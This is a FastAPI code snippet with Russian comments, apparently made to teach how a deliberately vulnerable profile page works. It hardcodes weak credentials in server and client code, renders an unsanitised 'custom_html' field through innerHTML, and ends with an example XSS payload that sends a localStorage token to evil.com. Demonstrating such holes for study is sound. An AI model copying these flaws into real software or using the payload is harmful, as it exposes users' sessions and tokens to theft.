from fastapi import Depends
from fastapi.security import HTTPBasic, HTTPBasicCredentials

security = HTTPBasic()

# Уязвимый профиль пользователя
users_db = {
    "admin": {"password": "admin123", "profile": "Администратор"},
    "user1": {"password": "pass123", "profile": "Обычный пользователь"}
}

@app.get("/api/user/profile_unsafe")
async def get_profile_unsafe(credentials: HTTPBasicCredentials = Depends(security)):
    """Уязвимый API endpoint, который возвращает данные для JS"""
    if credentials.username not in users_db:
        return {"error": "Пользователь не найден"}
    
    user = users_db[credentials.username]
    
    # УЯЗВИМОСТЬ: данные возвращаются без валидации для JS
    return {
        "username": credentials.username,
        "profile": user["profile"],
        # Уязвимое поле - может содержать XSS
        "custom_html": user.get("custom_html", "")
    }

@app.get("/profile_unsafe", response_class=HTMLResponse)
async def profile_page_unsafe():
    """Уязвимая страница профиля, которая использует данные из API"""
    html_content = """
    <html>
    <head>
        <title>Профиль</title>
        <script>
            async function loadProfile() {
                // Получаем данные профиля
                const response = await fetch('/api/user/profile_unsafe', {
                    headers: {
                        'Authorization': 'Basic ' + btoa('admin:admin123')
                    }
                });
                const data = await response.json();
                
                // УЯЗВИМОСТЬ: прямой innerHTML без санитизации
                document.getElementById('profile-info').innerHTML = 
                    `<h2>${data.username}</h2>
                     <p>${data.profile}</p>
                     <div>${data.custom_html}</div>`;
            }
        </script>
    </head>
    <body onload="loadProfile()">
        <h1>Мой профиль</h1>
        <div id="profile-info">Загрузка...</div>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# Пример эксплуатации:
# Если attacker может изменить custom_html в БД, он может добавить:
# <img src=x onerror="fetch('https://evil.com/steal?data='+localStorage.getItem('token'))">